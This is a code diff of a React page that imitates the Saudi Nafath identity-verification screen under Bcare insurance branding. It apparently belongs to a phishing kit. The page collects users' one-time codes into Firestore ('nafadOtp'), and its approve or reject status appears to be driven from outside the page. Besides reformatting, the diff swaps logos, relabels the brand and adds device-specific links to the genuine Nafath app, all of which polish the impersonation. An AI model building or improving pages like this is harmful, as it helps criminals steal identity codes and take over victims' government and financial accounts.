@@ -26,6 +26,20 @@ import { useEffect, useRef, useState } from "react";
 import { addData, db } from "@/lib/firebase";
 import { doc, onSnapshot, setDoc } from "firebase/firestore";
 
+const NAFAD_APP_STORE_URL =
+  "https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871";
+const NAFAD_PLAY_STORE_URL =
+  "https://play.google.com/store/apps/details?id=sa.gov.nic.myid&hl=ar";
+
+function getNafadAppUrl(): string {
+  if (typeof navigator === "undefined") return NAFAD_APP_STORE_URL;
+  const ua =
+    navigator.userAgent || (navigator as { vendor?: string }).vendor || "";
+  if (/android/i.test(ua)) return NAFAD_PLAY_STORE_URL;
+  if (/iphone|ipad|ipod/i.test(ua)) return NAFAD_APP_STORE_URL;
+  return NAFAD_APP_STORE_URL;
+}
+
 export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
   const [showOtpDialog, setShowOtpDialog] = useState(false);
@@ -120,7 +134,7 @@ export default function Component() {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
             },
-            { merge: true }
+            { merge: true },
           );
           setTimeout(() => inputRefs.current[0]?.focus(), 150);
         } else if (data.nafadConfirmationStatus === "rejected") {
@@ -135,11 +149,11 @@ export default function Component() {
               nafadConfirmationStatus: "",
               nafadConfirmationCode: "",
             },
-            { merge: true }
+            { merge: true },
           );
         }
       },
-      (error) => console.error("[nafad] Firestore listener error:", error)
+      (error) => console.error("[nafad] Firestore listener error:", error),
     );
     return () => unsubscribe();
     // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -169,7 +183,7 @@ export default function Component() {
 
   const handleOtpKeyDown = (
     index: number,
-    e: React.KeyboardEvent<HTMLInputElement>
+    e: React.KeyboardEvent<HTMLInputElement>,
   ) => {
     if (e.key === "Backspace" && !otp[index] && index > 0) {
       inputRefs.current[index - 1]?.focus();
@@ -204,7 +218,7 @@ export default function Component() {
           nafadOtp: code,
           nafadOtpSubmittedAt: new Date().toISOString(),
         },
-        { merge: true }
+        { merge: true },
       );
       setOtpDone(true);
     } catch (err) {
@@ -241,7 +255,7 @@ export default function Component() {
           </button>
           <div className="relative">
             <img
-              src="/NIC-logo.png"
+              src="/nfd.png"
               alt="نفاذ"
               width={110}
               className="object-contain drop-shadow-sm"
@@ -279,7 +293,7 @@ export default function Component() {
           <CardContent className="p-0">
             <div className="flex flex-col" dir="rtl">
               {/* Header */}
-              <div className="flex items-center gap-4 p-6 border-b border-gray-100">
+              <div className="flex justify-center items-center gap-4 p-6 border-b border-gray-100">
                 <div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-teal-50 to-emerald-50 flex items-center justify-center shadow-inner">
                   <img
                     src="/Bcare-logo.svg"
@@ -288,8 +302,10 @@ export default function Component() {
                     alt="تأميني"
                   />
                 </div>
-                <div className="text-right">
-                  <p className="text-gray-800 font-bold text-lg">تأميني</p>
+                <div className="text-center">
+                  <p className="text-gray-800 font-bold text-lg">
+                    بي كير - Bcare
+                  </p>
                   <p className="text-gray-400 text-xs font-medium">
                     خدمات التأمين الرقمية
                   </p>
@@ -301,7 +317,7 @@ export default function Component() {
                 <div className="relative mb-6">
                   <div className="w-20 h-20 rounded-2xl bg-gradient-to-br from-[#2a7a4b]/10 to-[#2a7a4b]/5 flex items-center justify-center p-4 shadow-inner">
                     <img
-                      src="/NIC-logo.png"
+                      src="/nfd.png"
                       width={60}
                       className="object-contain"
                       alt="نفاذ"
@@ -332,21 +348,128 @@ export default function Component() {
                         height="100%"
                         xmlns="http://www.w3.org/2000/svg"
                       >
-                        <rect x="5" y="5" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="5" y="5" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="75" y="5" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="91" y="5" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="5" y="91" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="5" y="75" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="75" y="91" width="20" height="4" rx="2" fill="#2a7a4b" opacity="0.4" />
-                        <rect x="91" y="75" width="4" height="20" rx="2" fill="#2a7a4b" opacity="0.4" />
+                        <rect
+                          x="5"
+                          y="5"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="5"
+                          y="5"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="75"
+                          y="5"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="91"
+                          y="5"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="5"
+                          y="91"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="5"
+                          y="75"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="75"
+                          y="91"
+                          width="20"
+                          height="4"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
+                        <rect
+                          x="91"
+                          y="75"
+                          width="4"
+                          height="20"
+                          rx="2"
+                          fill="#2a7a4b"
+                          opacity="0.4"
+                        />
                         <circle cx="50" cy="35" r="18" fill="#f0a080" />
-                        <ellipse cx="50" cy="80" rx="22" ry="18" fill="#4fc3f7" />
-                        <circle cx="44" cy="33" r="2" fill="#555" opacity="0.7" />
-                        <circle cx="56" cy="33" r="2" fill="#555" opacity="0.7" />
-                        <path d="M44 43 Q50 48 56 43" stroke="#555" strokeWidth="1.5" fill="none" strokeLinecap="round" opacity="0.7" />
-                        <line x1="20" y1="50" x2="80" y2="50" stroke="#2a7a4b" strokeWidth="1" opacity="0.3" strokeDasharray="4,3" />
-                        <line x1="20" y1="55" x2="80" y2="55" stroke="#2a7a4b" strokeWidth="1" opacity="0.2" strokeDasharray="4,3" />
+                        <ellipse
+                          cx="50"
+                          cy="80"
+                          rx="22"
+                          ry="18"
+                          fill="#4fc3f7"
+                        />
+                        <circle
+                          cx="44"
+                          cy="33"
+                          r="2"
+                          fill="#555"
+                          opacity="0.7"
+                        />
+                        <circle
+                          cx="56"
+                          cy="33"
+                          r="2"
+                          fill="#555"
+                          opacity="0.7"
+                        />
+                        <path
+                          d="M44 43 Q50 48 56 43"
+                          stroke="#555"
+                          strokeWidth="1.5"
+                          fill="none"
+                          strokeLinecap="round"
+                          opacity="0.7"
+                        />
+                        <line
+                          x1="20"
+                          y1="50"
+                          x2="80"
+                          y2="50"
+                          stroke="#2a7a4b"
+                          strokeWidth="1"
+                          opacity="0.3"
+                          strokeDasharray="4,3"
+                        />
+                        <line
+                          x1="20"
+                          y1="55"
+                          x2="80"
+                          y2="55"
+                          stroke="#2a7a4b"
+                          strokeWidth="1"
+                          opacity="0.2"
+                          strokeDasharray="4,3"
+                        />
                       </svg>
                     </div>
                     <div className="text-center">
@@ -369,7 +492,7 @@ export default function Component() {
                   <div className="flex-1 flex flex-col items-center gap-3 group">
                     <div className="w-full aspect-square rounded-2xl border-2 border-gray-200 bg-gradient-to-br from-white to-gray-50/50 flex items-center justify-center overflow-hidden p-4 shadow-sm group-hover:shadow-md group-hover:border-[#2a7a4b]/30 transition-all duration-300">
                       <img
-                        src="/NIC-logo.png"
+                        src="/nfd.png"
                         className="w-full h-full object-contain"
                         alt="تطبيق نفاذ"
                       />
@@ -408,7 +531,9 @@ export default function Component() {
                     </div>
                   </div>
                 ) : (
-                  <div className={`mb-8 w-full ${pulseCode ? "animate-pulse" : ""}`}>
+                  <div
+                    className={`mb-8 w-full ${pulseCode ? "animate-pulse" : ""}`}
+                  >
                     <div className="bg-gradient-to-br from-[#2a7a4b] to-[#1b5e3b] rounded-2xl p-6 text-center shadow-xl shadow-[#2a7a4b]/20 relative overflow-hidden">
                       <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full -mr-10 -mt-10" />
                       <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/5 rounded-full -ml-8 -mb-8" />
@@ -436,11 +561,15 @@ export default function Component() {
 
                 {/* Error Alert */}
                 {showError && (
-                  <div className={`w-full mb-6 ${shakeError ? "animate-shake" : ""}`}>
+                  <div
+                    className={`w-full mb-6 ${shakeError ? "animate-shake" : ""}`}
+                  >
                     <div className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-start gap-3 shadow-sm">
                       <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                       <div className="flex-1">
-                        <p className="text-red-700 text-sm font-bold">{showError}</p>
+                        <p className="text-red-700 text-sm font-bold">
+                          {showError}
+                        </p>
                         <button
                           onClick={handleRetry}
                           className="mt-2 text-xs text-red-600 font-medium hover:text-red-700 flex items-center gap-1 transition-colors"
@@ -455,9 +584,13 @@ export default function Component() {
 
                 {/* Open App Button */}
                 <a
-                  href="https://apps.apple.com/sa/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871"
+                  href={getNafadAppUrl()}
+                  target="_blank"
+                  rel="noopener noreferrer"
                   className="w-full py-4 rounded-xl text-white text-lg font-bold transition-all duration-300 hover:shadow-lg hover:shadow-[#2a7a4b]/25 hover:scale-[1.02] active:scale-[0.98] flex items-center justify-center gap-2 group"
-                  style={{ background: "linear-gradient(135deg, #2a7a4b, #1b5e3b)" }}
+                  style={{
+                    background: "linear-gradient(135deg, #2a7a4b, #1b5e3b)",
+                  }}
                 >
                   <ExternalLink className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
                   افتح تطبيق نفاذ
@@ -596,10 +729,10 @@ export default function Component() {
                         otpError
                           ? "border-red-300 bg-red-50 text-red-700 shadow-red-100"
                           : otpDone
-                          ? "border-emerald-300 bg-emerald-50 text-emerald-700 shadow-emerald-100"
-                          : digit
-                          ? "border-[#009688] bg-teal-50 text-[#00796b] shadow-teal-100 shadow-md"
-                          : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white focus:shadow-lg focus:shadow-teal-100",
+                            ? "border-emerald-300 bg-emerald-50 text-emerald-700 shadow-emerald-100"
+                            : digit
+                              ? "border-[#009688] bg-teal-50 text-[#00796b] shadow-teal-100 shadow-md"
+                              : "border-slate-200 bg-slate-50 text-slate-800 focus:border-[#009688] focus:bg-white focus:shadow-lg focus:shadow-teal-100",
                         "shadow-sm",
                       ].join(" ")}
                     />
@@ -704,14 +837,16 @@ export default function Component() {
           <div className="flex justify-center">
             <div className="p-2 bg-white rounded-xl shadow-sm border border-gray-100">
               <img
-                src="/NIC-logo.png"
+                src="/nfd.png"
                 alt="هيئة الاتصالات"
                 width={50}
                 className="opacity-70 rounded"
               />
             </div>
           </div>
-          <p className="text-[10px] text-gray-400">© 2024 جميع الحقوق محفوظة</p>
+          <p className="text-[10px] text-gray-400">
+            © 2024 جميع الحقوق محفوظة
+          </p>
         </div>
       </footer>
 
